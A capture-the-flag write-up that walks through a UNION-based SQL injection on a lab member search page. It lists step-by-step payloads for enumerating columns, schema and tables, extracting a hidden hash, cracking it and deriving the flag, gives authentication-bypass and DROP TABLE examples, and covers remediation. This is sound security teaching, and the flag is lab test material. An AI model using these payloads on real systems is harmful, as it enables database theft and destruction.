# 🚩 3 : SQL Injection (Member Search)

---

## 📝 Overview

This breach demonstrates how web applications can be compromised when user
input is inserted directly into SQL queries without sanitization. We identify
a classic UNION-based SQL Injection vulnerability, extract hidden data from
the database, and discuss why parameterized queries are the only reliable
defense.

The core problem is simple: the server takes whatever the user types into the
search field and glues it directly into a SQL query. This means the user can
write their own SQL and the database will execute it.

---

## 🔍 The Vulnerability: Unsanitized SQL Input

### What is SQL Injection?

When a web application queries a database, it builds a SQL statement using
user input. If the developer concatenates that input directly into the query
string, an attacker can break out of the intended query and append their own.

In this case, the member search page builds a query like:

```sql
SELECT first_name, last_name FROM users WHERE id = [YOUR INPUT]
```

If you type `1`, the query fetches user #1. If you type `1 OR 1=1`, the
query becomes:

```sql
SELECT first_name, last_name FROM users WHERE id = 1 OR 1=1
```

`1=1` is always true, so every row in the table is returned. The database
is now executing your logic, not just reading your input as a value.

### How We Confirmed It

Three tests confirmed the field was injectable:

| Input | Result | What it means |
|-------|--------|---------------|
| `1` | Returns one user | Normal behavior |
| `hello` | `Unknown column 'hello' in where clause` | Input lands unquoted in SQL |
| `1 OR 1=1` | Returns all 4 users | Database executes our logic |
| `1 AND 1=2` | Returns nothing | `1=2` is always false |

The error message on `hello` was particularly revealing — it exposed the
exact query structure and confirmed the database is MariaDB/MySQL.

> **A secure server should never show raw database errors to the user.**
> The moment you see one, you know input is reaching the database unsanitized.

---

## 🛠 The Exploit Path

### Step 1: Find the Column Count

Before appending our own SELECT, we need to know how many columns the
original query returns. UNION requires both SELECTs to have the same
number of columns.

We test with `null` placeholders:

```
1 UNION SELECT null, null--
```

No error + an extra empty row returned → **2 columns confirmed**.

The `--` at the end is a SQL comment, telling the database to ignore
everything after our injection.

### Step 2: Find the Database Name

Using a built-in MySQL function that requires no quotes:

```
1 UNION SELECT database(), null--
```

Result: `Member_Sql_Injection`

`database()` is powerful here because it works dynamically — no need to
know or hardcode the database name in advance.

### Step 3: Map the Tables

We query MySQL's built-in metadata database `information_schema`, which
stores the structure of every database on the server:

```
1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = database()--
```

Result: `users`

Only one table exists in this database.

### Step 4: Find the Columns

Now we list all columns inside the `users` table. The server escapes single
quotes (`'` → `\'`), so we use **hex encoding** to pass the string `users`
without quotes:

```
users → 0x7573657273
```

```
1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x7573657273--
```

Result:
```
user_id, first_name, last_name, town, country, planet, Commentaire, countersign
```

`Commentaire` and `countersign` immediately stand out as suspicious —
a comment field and a field literally named "countersign" (a secret password).

### Step 5: Extract the Hidden Data

```
1 UNION SELECT Commentaire, countersign FROM users--
```

The last row returned:

```
Commentaire : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28
```

The developer left explicit instructions inside the database.

### Step 6: Crack the Hash and Follow the Instructions

`5ff9d0165b4f92b14994e5c685cdce28` is 32 hex characters → **MD5 hash**.

Cracked using CrackStation (rainbow table lookup):
```
5ff9d0165b4f92b14994e5c685cdce28 → FortyTwo
```

Following the instructions:
1. Lowercase → `fortytwo`
2. SHA256 hash → flag

```bash
echo -n "fortytwo" | sha256sum
```

---

## 🏁 Result

```
FLAG: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

---

## 🌍 Real-World Impact

SQL Injection is consistently ranked as one of the most critical web
vulnerabilities (OWASP Top 10). Real-world consequences include:

**a) Data Breach**
An attacker can dump entire databases — usernames, passwords, emails,
credit card numbers, personal information — with a single injected query.

**b) Authentication Bypass**
By injecting `' OR '1'='1` into a login form, an attacker can log in as
any user, including administrators, without knowing any password.

**c) Data Destruction**
With write access, an attacker can inject `DROP TABLE users--` or
`DELETE FROM orders--`, permanently destroying data.

**d) Server Takeover**
In some configurations, SQL injection can be escalated to execute
operating system commands, giving the attacker full control of the server.

---

## 🛡️ Remediation Strategies

### 1. Use Parameterized Queries (Prepared Statements)

This is the only real fix. The database receives the query structure and
the data **separately**, making it impossible to mix them:

```php
// VULNERABLE - never do this
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// SECURE - always do this
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

With a prepared statement, even if the user types `1 OR 1=1`, the database
treats the entire string as a data value, not as SQL code.

### 2. Never Expose Database Errors

Raw database error messages tell attackers exactly what database is running,
what the query structure looks like, and where their input lands. Always
catch errors server-side and show only a generic message to the user:

```php
// SECURE
try {
    $stmt->execute();
} catch (Exception $e) {
    error_log($e->getMessage()); // log privately
    die("An error occurred.");   // show nothing useful
}
```

### 3. Apply the Principle of Least Privilege

The database user the application connects with should only have the
permissions it actually needs. A user that only reads data should never
have DROP, DELETE, or UPDATE permissions. This limits the damage an
attacker can do even if injection succeeds.

### 4. Never Store Passwords with MD5

MD5 is broken and trivially crackable using rainbow tables. Use
**bcrypt**, **Argon2**, or **scrypt** for password hashing — algorithms
designed to be slow and resistant to brute force.

---

## 📊 Attack Chain Summary

```
1. Probe field          →  error revealed unquoted input in WHERE clause
2. Confirm injection    →  1 OR 1=1 returned all rows
3. Find column count    →  UNION SELECT null, null-- worked → 2 columns
4. Find database name   →  database() → Member_Sql_Injection
5. Find table name      →  information_schema.tables → users
6. Find column names    →  information_schema.columns → Commentaire, countersign
7. Extract hidden data  →  instructions + MD5 hash in Commentaire/countersign
8. Crack MD5            →  5ff9d0165b4f92b14994e5c685cdce28 → FortyTwo
9. Follow instructions  →  lowercase → fortytwo → SHA256 → flag
```
